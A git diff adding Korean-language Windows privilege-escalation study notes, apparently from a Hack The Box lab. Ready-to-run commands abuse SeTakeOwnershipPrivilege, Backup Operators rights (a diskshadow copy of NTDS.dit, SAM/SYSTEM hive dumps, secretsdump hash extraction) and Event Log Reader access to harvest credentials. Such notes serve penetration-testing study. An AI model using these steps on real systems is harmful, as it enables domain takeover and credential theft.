@@ -232,6 +232,147 @@ mimikatz # sekurlsa::logonpasswords
 > 참고 사이트 1 : https://steflan-security.com/windows-privilege-escalation-cheat-sheet/<br/>
 > 참고 사이트 2 : https://book.martiandefense.llc/notes/network-security/windows-privesc/windows-user-privileges 
 
+<br/><br/>
+# SeTakeOwnershipPrivilege
+
+## 특권 활용
+
+### 현재 사용자 권한 검토
+```whoami /priv```
+
+### SeTakeOwnershipPrivilege 활성화
+- [블로그](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)
+- [스크립트](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
+- [개념 설명](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77)
+```
+Import-Module .\Enable-Privilege.ps1
+.\EnableAllTokenPrivs.ps1
+whoami /priv
+```
+
+### 대상 파일 선택
+```Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}```
+
+### 파일 소유권 확인
+```cmd /c dir /q 'C:\Department Shares\Private\IT'```
+
+### 파일 소유권 취득
+```takeown /f 'C:\Department Shares\Private\IT\cred.txt'```
+
+### 소유권 변경 확인
+```Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}```
+
+### 파일 ACL 수정
+```cat 'C:\Department Shares\Private\IT\cred.txt'```<br/>
+```icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F```
+
+### 파일 읽기
+```cat 'C:\Department Shares\Private\IT\cred.txt'```
+
+## 언제 사용하나
+
+### 관심 있는 파일
+```
+c:\inetpub\wwwwroot\web.config
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+```
+> `.kdbx` KeepPass 데이터베이스 파일, OneNote 노트북, `passwords.*`, `pass.*`, `creds.*`, scripts, 기타 구성 파일, 가상 하드 드라이브 파일 등 민감 정보가 있는 파일
+
+<br/><br/>
+# Windows Built-in Groups
+
+## Backup Operators
+- [PoC](https://github.com/giuliano108/SeBackupPrivilege)
+
+### 라이브러리 가져오기
+```
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+```
+
+### SeBackupPrivilege가 활성화되어 있는지 확인
+```whoami /priv```<br/>
+```Get-SeBackupPrivilege```
+
+### SeBackupPrivilege 활성화
+```
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+whoami /priv
+```
+
+### 보호된 파일 복사
+```
+dir C:\Confidential\
+cat 'C:\Confidential\2021 Contract.txt'
+Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+```
+
+### 도메인 컨트롤러 공격 - NTDS.dit 복사
+```
+diskshadow.exe
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+```
+```dir E:```
+
+### NTDS.dit 로컬 복사
+```Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit```
+
+### SAM 및 SYSTEM 레지스트리 하이브 백업
+```
+reg save HKLM\SYSTEM SYSTEM.SAV
+reg save HKLM\SAM SAM.SAV
+```
+
+### NTDS.dit에서 자격 증명 추출
+```
+Import-Module .\DSInternals.psd1
+$key = Get-BootKey -SystemHivePath .\SYSTEM
+Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+```
+
+### SecretsDump를 사용하여 해시 추출
+```secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL```
+
+<br/><br/>
+## Robocopy
+
+### Robocopy로 파일 복사하기
+```robocopy /B E:\Windows\NTDS .\ntds ntds.dit```
+
+<br/><br/>
+# 이벤트 로그 리더
+
+### 그룹 멤버십 확인
+```net localgroup "Event Log Readers"```
+
+### wevtutil을 사용하여 보안 로그 검색
+```wevtutil qe Security /rd:true /f:text | Select-String "/user"```
+
+### wevtutil에 자격 증명 전달
+```wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"```
+
+### Get-WinEvent를 사용하여 보안 로그 검색
+```Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}```
+
+<br/><br/>
+# DNS 관리자
 
 
 
